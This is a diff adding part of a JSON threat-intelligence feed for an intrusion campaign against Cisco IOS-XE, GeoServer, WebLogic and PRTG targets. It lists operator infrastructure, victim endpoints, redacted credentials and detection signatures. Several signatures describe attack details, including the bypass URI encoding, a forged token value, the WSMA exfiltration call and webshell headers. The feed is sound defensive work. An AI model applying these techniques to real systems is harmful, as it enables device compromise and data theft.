+        "notes": "Probed with real customer-ID ranges at escalating concurrency. Intent held at MODERATE because bodies are discarded, there is no validity logic, and the scripts self-label BENCHMARK",
+        "false_positive_risk": true,
+        "false_positive_note": "Legitimate bank domain. This is a victim/target, never a blockable indicator"
+      },
+      {
+        "value": "serviciosnabon.com",
+        "role": "Certificate presented by the WebLogic target during the campaign",
+        "confidence": "MODERATE",
+        "action": "HUNT",
+        "notes": "Sectigo certificate valid 2025-12-30 to 2027-01-30. Domain has since moved off CNT address space"
+      }
+    ],
+    "urls": [
+      {
+        "value": "http://13.140.145.210/",
+        "role": "Exfiltration destination in the WSMA fileCopy dstURL",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "context": "Operator VPS staging server root. Victim hosts fetched operator tooling (chisel_win.exe, plink.exe) from this origin."
+      },
+      {
+        "value": "http://13.140.145.210:4445/",
+        "role": "Beacon and reverse-shell callback endpoint",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "notes": "Beacon path form is /CLASS-RCE-$(whoami)"
+      },
+      {
+        "value": "http://13.140.145.210:8888/",
+        "role": "Open directory and javaCodeBase staging URL for JNDI reference payloads",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "notes": "Directory listing closed 2026-08-04"
+      },
+      {
+        "value": "https://bancanet.banamex.com/MXGCB/REST/forpasswrd/getCustomerName.jws",
+        "role": "TARGET - probed bank password-reset endpoint",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "false_positive_risk": true,
+        "false_positive_note": "Legitimate bank endpoint. Never block",
+        "context": "VICTIM-SIDE endpoint, not operator infrastructure. Mexican bank password-reset endpoint iterated over customerId ranges by vps_bench{,2,3}.sh. Intent MODERATE: the scripts discard the response body and self-label BENCHMARK, so this is as consistent with a rate-limit probe as with a customer-enumeration oracle. Do not block."
+      }
+    ],
+    "user_agents": [
+      {
+        "value": "cisco-IOS",
+        "role": "VICTIM-generated user agent on all 100 exfiltration PUTs",
+        "confidence": "DEFINITE",
+        "action": "HUNT",
+        "notes": "This is the victim device's own user agent, not the operator's. An outbound HTTP PUT carrying it to a non-management destination is the highest-fidelity signal in the case, because the operator cannot suppress it"
+      }
+    ],
+    "email_addresses": []
+  },
+  "host_indicators": {
+    "file_paths": [
+      {
+        "path": "/usr/local/bin/safe_pollRadiusLog.sh",
+        "platform": "Linux",
+        "confidence": "HIGH",
+        "notes": "Operator-written self-healing radstatd watchdog on a CNT AAA server, mtime backdated to 2010-10-07 00:00:00"
+      },
+      {
+        "path": "/opt/aaa/bin/radstatd",
+        "platform": "Linux",
+        "confidence": "HIGH",
+        "notes": "Victim RADIUS statistics daemon the operator kept alive. Path knowledge demonstrates prior access"
+      },
+      {
+        "path": "/usr/local/bin/pollRadiusLog.php",
+        "platform": "Linux",
+        "confidence": "HIGH",
+        "notes": "Victim RADIUS log poller wrapped by the operator's watchdog"
+      },
+      {
+        "path": "/root/.ssh/sysgad_key",
+        "platform": "Linux (operator side)",
+        "confidence": "HIGH",
+        "notes": "Operator SSH private key for the CNT jump host. Provenance unknown"
+      },
+      {
+        "path": "/tmp/CVE-2023-21839/",
+        "platform": "Linux (operator side)",
+        "confidence": "DEFINITE",
+        "notes": "Go build tree for both exploit builds"
+      },
+      {
+        "path": "/tmp/andinet.sh",
+        "platform": "Linux (operator side)",
+        "confidence": "HIGH",
+        "notes": "CNT/Andinanet script of at least 122 lines, never archived, known only from its own error output"
+      },
+      {
+        "path": "/tmp/prtg_devices.json",
+        "platform": "Linux (operator side)",
+        "confidence": "DEFINITE",
+        "notes": "PRTG harvest staging file, deleted by the script"
+      },
+      {
+        "path": "C:\\wamp64\\www\\h.php",
+        "platform": "Windows",
+        "confidence": "HIGH",
+        "notes": "Persistent webshell dispatching on an X-CMD request header. Pre-existing on the victim, not dropped by the captured scripts"
+      },
+      {
+        "path": "C:\\wamp64\\www\\x.php",
+        "platform": "Windows",
+        "confidence": "HIGH",
+        "notes": "Ephemeral webshell written per command via the GeoServer RCE and deleted after each use"
+      },
+      {
+        "path": "C:\\wamp64\\www\\.s.bak",
+        "platform": "Windows",
+        "confidence": "HIGH",
+        "notes": "SAM hive dump staged in the web root for HTTP retrieval, then deleted"
+      },
+      {
+        "path": "C:\\wamp64\\www\\.y.bak",
+        "platform": "Windows",
+        "confidence": "HIGH",
+        "notes": "SYSTEM hive dump staged in the web root for HTTP retrieval, then deleted"
+      },
+      {
+        "path": "bin/ps, usr/bin/top, usr/bin/pstree, bin/netstat, usr/sbin/lsof, usr/bin/find, bin/rpm",
+        "platform": "Linux",
+        "confidence": "HIGH",
+        "notes": "Userland rootkit target set. A batch mtime or hash change across exactly these seven, or the presence of a tar archive containing exactly them, is the install signature Staging is HIGH (the originals-backup was recovered); install-on-victim is MODERATE and capped there, because the trojaned replacement binaries were never captured."
+      },
+      {
+        "path": "/sw/rp/0/0/rp_daemons/mount/usr/binos/conf/smgmt2.lua",
+        "platform": "Cisco IOS-XE BinOS",
+        "confidence": "DEFINITE",
+        "notes": "The IOS-XE WebUI Lua auth handler whose crash at line 336 generates the core dumps the operator harvests"
+      }
+    ],
+    "process_artifacts": [
+      {
+        "value": "127.0.0.1:19999",
+        "confidence": "HIGH",
+        "notes": "Operator custom multi-session C2 console bound to localhost on the VPS. Verbs sessions and use <cid>. The server (console.py) was never archived"
+      },
+      {
+        "value": "127.0.0.1:1080",
+        "confidence": "HIGH",
+        "notes": "Local SOCKS listener created by the chisel reverse tunnel, referenced by both proxychains configs and by the SSH ProxyCommand"
+      }
+    ]
+  },
+  "tls_certificates": [
+    {
+      "subject": "CN=13.140.145.210",
+      "issuer": "CN=13.140.145.210",
+      "self_signed": true,
+      "generated": "2026-07-24T12:50:23Z",
+      "sha256": "3797dddabdef5e9607c9c0bde108922467adf15d5e29cd6c6319df91b334a0c9",
+      "sha1": "aab136e06c94e5616832afa34af096bd6b77151c",
+      "serial": "373b099212237996e4394bdf8dd5a27715dccf13",
+      "spki_sha256": "e788774dfe961c999953ef72a208f198c58c47f14d4b7777d50abee835d75fff",
+      "confidence": "DEFINITE",
+      "notes": "Operator TLS material for the VPS listeners, generated the same day as the router theft. The subject is only the IP, so this will not cluster on subject or CN; it pivots only if the certificate or key pair was reused verbatim on another host. The SPKI hash survives certificate regeneration around the same key pair"
+    }
+  ],
+  "chisel_server_fingerprints": [
+    {
+      "value": "QUYR7vzzEgUcc0ZCMTMa2fhqTCYpm079H22GgOpiVhw=",
+      "confidence": "DEFINITE",
+      "notes": "Operator chisel server key fingerprint 1 of 4"
+    },
+    {
+      "value": "H2ic0XP8aiB2QukBo2FS0uj3Gnfgmp6nigjii9mLs20=",
+      "confidence": "DEFINITE",
+      "notes": "Operator chisel server key fingerprint 2 of 4"
+    },
+    {
+      "value": "JDVUvnWeQAoTmAgAm5tnty7wGWYi12RvInNjlOiUTyY=",
+      "confidence": "DEFINITE",
+      "notes": "Operator chisel server key fingerprint 3 of 4"
+    },
+    {
+      "value": "p5xQdPpv2XWiSHLz1kCVsbhZ/SXVVgptoPRoW/VONAs=",
+      "confidence": "DEFINITE",
+      "notes": "Operator chisel server key fingerprint 4 of 4"
+    }
+  ],
+  "credentials": [
+    {
+      "type": "third_party_api_key",
+      "service": "Shodan",
+      "value_redacted": "H3yv3vx...bAvs",
+      "confidence": "DEFINITE (present in the sample); MODERATE (ownership)",
+      "notes": "Hard-coded at shodan_full.py line 7 and used at line 107. Deliberately truncated to first-8 plus last-4 per credential-redaction hygiene; the full value is held only in the local investigation directory and was offered only in direct disclosure to the issuing vendor. Ownership is not established: this may be the operator's own account or a key stolen from a legitimate Shodan customer, in which case a third party is unknowingly implicated. Do not use this key"
+    },
+    {
+      "type": "application_credentials_held_by_operator",
+      "service": "PRTG Network Monitor",
+      "target": "181.112.150.104",
+      "confidence": "DEFINITE (held); provenance unknown",
+      "notes": "Hard-coded with no brute-force loop, so the operator held them before writing the script. Any PRTG deployment reachable by this operator should treat prtgadmin as compromised and rotate stored device credentials including root-group inherited credentials",
+      "value_redacted": "prtgadmin / passhash fully withheld",
+      "redaction_note": "A PRTG passhash functions directly as an API authentication token, so the value is withheld from this public feed IN FULL. No partial value is given: the hash is a short numeric string, and publishing any leading or trailing digits would collapse the search space far enough to make the remainder guessable, which would defeat the withholding. The full value was provided to CNT EP in direct disclosure on 2026-08-17 and is held only in the local investigation record. The account name is published deliberately, because rotating prtgadmin and every stored device credential beneath it is the action a defender needs to take."
+    },
+    {
+      "type": "spray_credentials_attempted",
+      "target": "192.168.10.1",
+      "confidence": "DEFINITE (attempted); success unknown",
+      "notes": "The password strings name an Ecuadorian municipal government and a biometrics system, which indicates prior knowledge of the environment",
+      "value_redacted": "Administrador and admin crossed with a municipality-derived password, a biometrics-system-derived password, Admin123, admin, sa. The two environment-specific strings are withheld.",
+      "redaction_note": "Two of the five password strings encode an Ecuadorian municipal government and a biometrics system by name and are plausible working credentials for that environment, so they are withheld from this public feed. The analytical point does not depend on the literals: the operator built environment-specific mutations, which indicates prior knowledge of the target rather than generic spraying."
+    },
+    {
+      "type": "default_credentials_attempted",
+      "service": "GeoServer",
+      "value": "admin:geoserver, master password geoserver",
+      "confidence": "DEFINITE (attempted)",
+      "notes": "Used against both the RCE surface and the encrypted datastore password store",
+      "publication_note": "Retained in full. These are published GeoServer vendor defaults, not a victim secret."
+    },
+    {
+      "type": "cracking_candidates_rejected",
+      "target": "IOS-XE WebUI admin hash from nginx core dumps",
+      "confidence": "DEFINITE (attempted and FAILED)",
+      "notes": "All 21 candidates were rejected and zero Auth= tokens were recovered. Recorded so that no downstream product claims credential recovery succeeded",
+      "value_redacted": "21 candidate passwords, all rejected. Literals withheld.",
+      "redaction_note": "Every one of the 21 candidates failed and zero Auth= tokens were recovered, so none is a confirmed credential for this victim. Several resemble real strings harvested elsewhere in the operator wordlists, so the literals are withheld. Recorded so that no downstream product claims credential recovery succeeded."
+    }
+  ],
+  "network_signatures": [
+    {
+      "pattern": "HTTP request URI containing %2577eb%2575i or %2577eb%2575i_%2577sma_Http",
+      "protocol": "HTTP",
+      "direction": "inbound to an IOS-XE web management interface",
+      "confidence": "DEFINITE",
+      "notes": "Operator-specific double-encoded WSMA bypass. Public proofs of concept use single-encoded lowercase %77ebui_wsma_http, so the capital H and the encoding of only w and u are this operator's fingerprint"
+    },
+    {
+      "pattern": "Authorization header matching ^[a-f0-9]{18}$ with no auth scheme",
+      "protocol": "HTTP",
+      "direction": "inbound to an IOS-XE web management interface",
+      "confidence": "HIGH",
+      "notes": "CVE-2023-20198 forged-token shape. This operator's literal is 0123456789abcdefab"
+    },
+    {
+      "pattern": "HTTP PUT with User-Agent: cisco-IOS to a destination outside the management range",
+      "protocol": "HTTP",
+      "direction": "outbound from a network device",
+      "confidence": "DEFINITE",
+      "notes": "Highest-fidelity signal in the case. Legitimate IOS does not PUT its own configs or firmware to the internet"
+    },
+    {
+      "pattern": "SOAP body containing urn:cisco:wsma-filesystem with a dstURL whose scheme is http:// and whose host is outside the management range",
+      "protocol": "HTTP",
+      "direction": "inbound to a network device",
+      "confidence": "HIGH",
+      "notes": "The exfiltration primitive. srcURL form is nvram:/<file>"
+    },
+    {
+      "pattern": "GeoServer ows request where valueReference or a property name contains exec( or Runtime.getRuntime",
+      "protocol": "HTTP",
+      "direction": "inbound",
+      "confidence": "HIGH",
+      "notes": "CVE-2024-36401 OGC-filter evaluation RCE"
+    },
+    {
+      "pattern": "PRTG API request carrying passhash= with getobjectproperty.htm and windowsloginpassword, linuxloginpassword or snmpcommunity",
+      "protocol": "HTTP",
+      "direction": "inbound",
+      "confidence": "HIGH",
+      "notes": "Bulk credential extraction from a monitoring platform"
+    },
+    {
+      "pattern": "HTTP request carrying an X-CMD: header",
+      "protocol": "HTTP",
+      "direction": "inbound",
+      "confidence": "HIGH",
+      "notes": "The h.php webshell command dispatcher"
+    },
+    {
+      "pattern": "T3 or IIOP traffic containing ForeignOpaqueReference, AggregatableOpaqueReference, or a MessageDestinationReference with a spoofed type string",
+      "protocol": "T3/IIOP",
+      "direction": "inbound to port 7001 or the IIOP port",
+      "confidence": "HIGH",
+      "notes": "The shared primitive across CVE-2023-21839 and its patch-bypass CVE-2024-21182"
+    },
+    {
+      "pattern": "LDAP response carrying javaCodeBase, javaSerializedData, javax.el.ELProcessor or com.sun.rowset.JdbcRowSetImpl",
+      "protocol": "LDAP",
+      "direction": "inbound to a Java application server",
+      "confidence": "HIGH",
+      "notes": "Covers all four modes of the operator's hand-written LDAP exploitation server"
+    },
+    {
+      "pattern": "Reverse connection from an internal host to an external host on 80, 443 or 8443 followed by a local SOCKS listener, or an HTTP upgrade to WebSocket carrying the chisel handshake",
+      "protocol": "HTTP/WebSocket",
+      "direction": "outbound",
+      "confidence": "HIGH",
+      "notes": "The CNT foothold mechanism. Pair with the four chisel server fingerprints for high fidelity"
+    },
+    {
+      "pattern": "Java serialized String hello_from_ldap, hex AC ED 00 05 74 00 0F 68 65 6C 6C 6F 5F 66 72 6F 6D 5F 6C 64 61 70",
+      "protocol": "LDAP/RMI",
+      "direction": "either",
+      "confidence": "DEFINITE",
+      "notes": "Operator's callback-plumbing validation payload"
+    }
+  ],
+  "behavioral_indicators": [
+    {
+      "pattern": "Repeated smgmt2.lua:336 arithmetic-on-nil errors in smgmt_parse_auth_hdr in an IOS-XE WebUI nginx log",
+      "type": "behavioral",
+      "log_source": "IOS-XE WebUI nginx error log",
+      "confidence": "DEFINITE",
+      "notes": "Active auth-bypass attempts. Each occurrence also means a fresh core dump now exists on the device holding live credential material"
+    },
+    {
+      "pattern": "A file under /usr/local/bin/ whose mtime predates its ctime by more than a year",
+      "type": "behavioral",
+      "log_source": "File integrity monitoring",
+      "confidence": "HIGH",
+      "notes": "Timestomping signature. Legitimate archive restores produce this too, so tier as hunting"
+    },
+    {
+      "pattern": "Batch mtime or hash change across ps, top, pstree, netstat, lsof, find and rpm",
+      "type": "behavioral",
+      "log_source": "File integrity monitoring",
+      "confidence": "HIGH",
+      "notes": "Userland rootkit install signature"
+    },
+    {
+      "pattern": "procps or psmisc package install after which ps and top change hash without a full system update",
+      "type": "behavioral",
+      "log_source": "Package manager logs correlated with file integrity monitoring",
+      "confidence": "HIGH",
+      "notes": "The replacement-delivery route named in pkg_names.txt"
+    },
+    {
+      "pattern": "Non-root process calling unshare with CLONE_NEWUSER and CLONE_NEWNET then creating an AF_ALG socket with cipher pcbc(fcrypt)",
+      "type": "behavioral",
+      "log_source": "Sysmon for Linux Event ID 1, auditd syscall auditing",
+      "confidence": "HIGH",
+      "notes": "Dirty Frag LPE execution. The cipher choice is near-unique"
+    },
+    {
+      "pattern": "Burst of XFRM security-association installs with SPI values in the 0xDEADBE10 to 0xDEADBE37 range",
+      "type": "behavioral",
+      "log_source": "Netlink or xfrm audit records",
+      "confidence": "HIGH",
+      "notes": "Dirty Frag payload-smuggling loop"
+    },
+    {
+      "pattern": "/etc/passwd line 1 mutated to a uid-0 entry, or any uid-0 account not named root",
+      "type": "behavioral",
+      "log_source": "File integrity monitoring",
+      "confidence": "HIGH",
+      "notes": "Dirty Frag rxrpc fallback outcome"
+    },
+    {
+      "pattern": "Content or hash change to /usr/bin/su with no corresponding package transaction",
+      "type": "behavioral",
+      "log_source": "File integrity monitoring",
+      "confidence": "HIGH",
+      "notes": "Dirty Frag ESP path outcome"
+    },
+    {
+      "pattern": "reg save HKLM\\SAM or HKLM\\SYSTEM writing into a web-served directory",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 1 and Event ID 11",
+      "confidence": "HIGH",
+      "notes": "The web-root destination is the discriminator"
+    },
+    {
+      "pattern": "Short single-purpose .php file created in a web root, requested once, then deleted",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 11 and 23 correlated with web-server access logs",
+      "confidence": "HIGH",
+      "notes": "The operator's per-session ephemeral webshell pattern"
+    },
+    {
+      "pattern": "powershell.exe spawned as a child of a web-server process such as httpd.exe, java.exe or w3wp.exe",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 1 with parent-process context",
+      "confidence": "HIGH",
+      "notes": "Webshell-driven execution"
+    },
+    {
+      "pattern": "New-PSSession or Test-WSMan burst from a web-server process against a single internal host",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 1, PowerShell Script Block Logging Event ID 4104",
+      "confidence": "HIGH",
+      "notes": "The WinRM-primary credential spray"
+    },
+    {
+      "pattern": "net use \\\\host\\IPC$ /user: repeated against one host with differing passwords",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 1, Security Event ID 4625 on the target",
+      "confidence": "HIGH",
+      "notes": "The IPC$ fallback spray"
+    },
+    {
+      "pattern": "route print piped to a filter for a specific internal supernet",
+      "type": "behavioral",
+      "log_source": "PowerShell Script Block Logging Event ID 4104",
+      "confidence": "MODERATE",
+      "notes": "The operator's stated objective was reachability into 172.x networks"
+    },
+    {
+      "pattern": "chisel_win.exe or plink.exe written to a management or network-adjacent host after being fetched from an external HTTP server",
+      "type": "behavioral",
+      "log_source": "Sysmon Event ID 11 plus Event ID 1",
+      "confidence": "HIGH",
+      "notes": "Requires the external-fetch context, since both are legitimate administrative tools"
+    },
+    {
+      "pattern": "A PRTG EXE/Script notification object created or its program property set, then triggered",
+      "type": "behavioral",
+      "log_source": "PRTG audit log, host process creation on the PRTG server",
+      "confidence": "HIGH",
+      "notes": "Feature-abuse RCE path that works on any PRTG version once admin is held"
+    }
+  ],
+  "exclusions": {
+    "note": "These indicators were considered and explicitly excluded. They are recorded so that downstream products do not reintroduce them.",
+    "not_this_operator": [
+      {
+        "value": "140.99.223.46",
+        "reason": "Independent intruder on the same Cisco router, 2026-05-12, using the generic public CVE-2023-20198 URI POST /webui/logoutconfirm.html?logon_hash=1. Limestone Networks, US"
+      },
+      {
+        "value": "147.124.203.51",
+        "reason": "Independent intruder on the same router, 2026-07-07, same generic URI. Tier.Net Technologies, US"
+      },
+      {
+        "value": "62.133.46.18",
+        "reason": "Browsed the same router's WebUI 2026-07-07 and 07-24 with AAA failures. M247, VT-tagged vpn"
+      },
+      {
+        "value": "146.70.52.222",
+        "reason": "Browsed the same router's WebUI three times on 2026-07-07 with AAA failures. M247, VT-tagged vpn"
+      },
+      {
+        "value": "47.130.108.237",
+        "reason": "Failed TLS handshake against the same router on 2026-07-07. AWS Singapore, probably scanner noise"
+      }
+    ],
+    "retracted": [
+      {
+        "value": "2.57.91.91",
+        "reason": "RETRACTED as an operator IP. radius-sync.com pointed here for approximately fifteen seconds at registration before being repointed. Hostinger shared parking infrastructure, AS47583, approximately 4.2 million domains. Its VT 9/91 is mass-hosting noise"
+      }
+    ]
+  },
+  "notes": {
+    "capability_versus_execution": "Only one CVE is confirmed to have succeeded against a victim: the Cisco IOS-XE chain (CVE-2023-20198 plus CVE-2023-20273). CVE-2024-36401 against GeoServer is weaponised with execution unconfirmed. CVE-2023-21839 and CVE-2024-21182 were weaponised and FAILED against 181.112.229.138. CVE-2020-14882, CVE-2020-2555 and the Dirty Frag LPE pair are staged only. CVE-2021-44228 is not exploited as Log4Shell at all; JNDIExploit.jar is reused as the callback server for the WebLogic JNDI injection, which is vulnerability-agnostic primitive reuse.",
+    "timeline_precision": "The 424,946,514-byte exfiltration is a single day, 2026-07-24. The February-to-July span on the stolen core dumps is their age on the victim device, a pre-existing cache taken in one pass. This is not five months of operator dwell time.",
+    "corpus_size": "169 unique operator files, carrying 171 operator-assigned filenames. merged-manifest.json holds 169 because two operator files were saved twice under different names and deduplicated by content hash: sph_admin.txt is byte-identical to sph_cve.txt, and wl_14882.txt is byte-identical to wl_t3.txt.",
+    "attribution": "No named-actor attribution. Operator-authored artifacts are uniformly Spanish. Two Chinese-authored public tools are present in the kit, and their documentation language is a property of the downloaded tools, not of the operator; it must not be cited as attribution evidence."
+  }
+}
